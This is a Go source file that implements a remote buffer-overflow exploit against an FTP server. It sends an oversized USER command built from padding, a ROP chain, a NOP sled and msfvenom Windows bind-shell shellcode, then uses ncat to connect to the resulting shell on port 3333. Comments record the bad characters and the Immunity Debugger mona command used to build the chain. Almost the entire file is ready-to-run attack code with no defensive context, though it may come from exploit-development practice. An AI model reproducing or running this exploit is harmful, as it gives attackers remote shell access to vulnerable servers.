package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"time"
	"strings"
	"os/exec"
)

func receive(conn net.Conn, reader *bufio.Reader) {
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	for {
		line, err := reader.ReadString('\n')
		if err == io.EOF {
			break
		} else if err != nil {
			return
		}
		fmt.Println(string(line))
	}
}

func main() {
	//eipPattern := "\xED\x1E\x94\x7C" //7C941EED jmp esp ntdll

	// Bad characters \x00 \x0a \x0d \x40

	//Inside Immunity Debugger
	//!mona rop -m msvcrt.dll -n -cpb '\x00\x0a\x0d\x40'

	//working rope chain #1
	rop := ""
	rop += "\x54\x1c\xc3\x77\x54\x1c\xc3\x77\x16\x34\xc4\x77\xa4"
	rop += "\x9e\xc4\x77\xa4\x9e\xc4\x77\x41\x41\x41\x41\x60\xb8"
	rop += "\xc2\x77\x41\x41\x41\x41\xcd\x4f\xbf\xa1\x81\x80\xc2"
	rop += "\x77\x9c\x8f\xc4\x77\x72\xe3\xc3\x77\xb5\xba\xf7\xa2"
	rop += "\x56\x15\xc2\x77\x38\x9f\xc4\x77\x3d\xe9\xc1\x77\x42"
	rop += "\x7a\xc3\x77\x8d\xa1\xc2\x77\xcc\xaa\xc1\x77\x16\x1d"
	rop += "\xc1\x77\x0c\x11\xc0\x77\xa1\x48\xc0\x77\xac\x9e\xc4"
	rop += "\x77"

	//working rope chain #2
	//rop := ""
	//rop += "\x3c\x08\xc1\x77\x3c\x08\xc1\x77\xd7\x50\xc4\x77\xa4"
	//rop += "\x9e\xc4\x77\xa4\x9e\xc4\x77\x41\x41\x41\x41\xf7\x21"
	//rop += "\xc4\x77\x41\x41\x41\x41\xcd\x4f\xbf\xa1\x81\x80\xc2"
	//rop += "\x77\x9c\x8f\xc4\x77\xba\xe0\xc3\x77\xb5\xba\xf7\xa2"
	//rop += "\x56\x15\xc2\x77\x38\x9f\xc4\x77\x16\x61\xc3\x77\x42"
	//rop += "\x7a\xc3\x77\x30\x6f\xc3\x77\xcc\xaa\xc1\x77\x72\xe3"
	//rop += "\xc3\x77\x0c\x11\xc0\x77\xa1\x48\xc0\x77\xac\x9e\xc4"
	//rop += "\x77"

	// msfvenom --payload-options -p windows/shell_bind_tcp
	// msfvenom -p windows/shell_bind_tcp lport=3333 exitfunc=seh -b '\x00\x0A\x40\x0D' -f py
	buf := ""
	buf += "\xbd\xb2\xbb\xa1\xbb\xdb\xca\xd9\x74\x24\xf4\x5f\x2b"
	buf += "\xc9\xb1\x53\x31\x6f\x12\x83\xef\xfc\x03\xdd\xb5\x43"
	buf += "\x4e\xdd\x22\x01\xb1\x1d\xb3\x66\x3b\xf8\x82\xa6\x5f"
	buf += "\x89\xb5\x16\x2b\xdf\x39\xdc\x79\xcb\xca\x90\x55\xfc"
	buf += "\x7b\x1e\x80\x33\x7b\x33\xf0\x52\xff\x4e\x25\xb4\x3e"
	buf += "\x81\x38\xb5\x07\xfc\xb1\xe7\xd0\x8a\x64\x17\x54\xc6"
	buf += "\xb4\x9c\x26\xc6\xbc\x41\xfe\xe9\xed\xd4\x74\xb0\x2d"
	buf += "\xd7\x59\xc8\x67\xcf\xbe\xf5\x3e\x64\x74\x81\xc0\xac"
	buf += "\x44\x6a\x6e\x91\x68\x99\x6e\xd6\x4f\x42\x05\x2e\xac"
	buf += "\xff\x1e\xf5\xce\xdb\xab\xed\x69\xaf\x0c\xc9\x88\x7c"
	buf += "\xca\x9a\x87\xc9\x98\xc4\x8b\xcc\x4d\x7f\xb7\x45\x70"
	buf += "\xaf\x31\x1d\x57\x6b\x19\xc5\xf6\x2a\xc7\xa8\x07\x2c"
	buf += "\xa8\x15\xa2\x27\x45\x41\xdf\x6a\x02\xa6\xd2\x94\xd2"
	buf += "\xa0\x65\xe7\xe0\x6f\xde\x6f\x49\xe7\xf8\x68\xae\xd2"
	buf += "\xbd\xe6\x51\xdd\xbd\x2f\x96\x89\xed\x47\x3f\xb2\x65"
	buf += "\x97\xc0\x67\x13\x9f\x67\xd8\x06\x62\xd7\x88\x86\xcc"
	buf += "\xb0\xc2\x08\x33\xa0\xec\xc2\x5c\x49\x11\xed\x6f\x8f"
	buf += "\x9c\x0b\x05\x9f\xc8\x84\xb1\x5d\x2f\x1d\x26\x9d\x05"
	buf += "\x35\xc0\xd6\x4f\x82\xef\xe6\x45\xa4\x67\x6d\x8a\x70"
	buf += "\x96\x72\x87\xd0\xcf\xe5\x5d\xb1\xa2\x94\x62\x98\x54"
	buf += "\x34\xf0\x47\xa4\x33\xe9\xdf\xf3\x14\xdf\x29\x91\x88"
	buf += "\x46\x80\x87\x50\x1e\xeb\x03\x8f\xe3\xf2\x8a\x42\x5f"
	buf += "\xd1\x9c\x9a\x60\x5d\xc8\x72\x37\x0b\xa6\x34\xe1\xfd"
	buf += "\x10\xef\x5e\x54\xf4\x76\xad\x67\x82\x76\xf8\x11\x6a"
	buf += "\xc6\x55\x64\x95\xe7\x31\x60\xee\x15\xa2\x8f\x25\x9e"
	buf += "\xdc\x7e\xf7\x0b\x48\xd9\x62\x76\x14\xda\x59\xb5\x21"
	buf += "\x59\x6b\x46\xd6\x41\x1e\x43\x92\xc5\xf3\x39\x8b\xa3"
	buf += "\xf3\xee\xac\xe1"
	fmt.Println("ROPE LEN: ", len(rop))

	username := fmt.Sprintf("%v%v%v%v%v",
		strings.Repeat("A", 485),
		//eipPattern,
		rop,
		strings.Repeat("\x90", 16),
		buf,
		strings.Repeat("\xCC", 1024-485-len(rop)-16-len(buf)))

	password := "somepassword"

	if len(os.Args) > 1 {
		hostAddress := os.Args[1]
		fmt.Println("[+] Host Address: ", hostAddress)
		conn, err := net.Dial("tcp", fmt.Sprintf("%v:21", hostAddress))
		if err != nil {
			fmt.Println("Error ocurred: ", err)
			os.Exit(1)
		}

		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		reader := bufio.NewReader(conn)
		receive(conn, reader)
		fmt.Println("[+] Sending user name")
		fmt.Fprintf(conn, "USER %v", username)
		receive(conn, reader)
		fmt.Fprintf(conn, "PASS %v\r\n", password)
		receive(conn, reader)
		fmt.Println("[+] Sending password")
		conn.Close()

		time.Sleep(time.Second * 5)
		fmt.Println("[+] Try to run shell")
		cmd := exec.Command("ncat", hostAddress, "3333")
		cmd.Stdout = os.Stdout
		cmd.Stdin = os.Stdin
		cmd.Stderr = os.Stderr
		cmd.Start()
		cmd.Wait()
	}
}
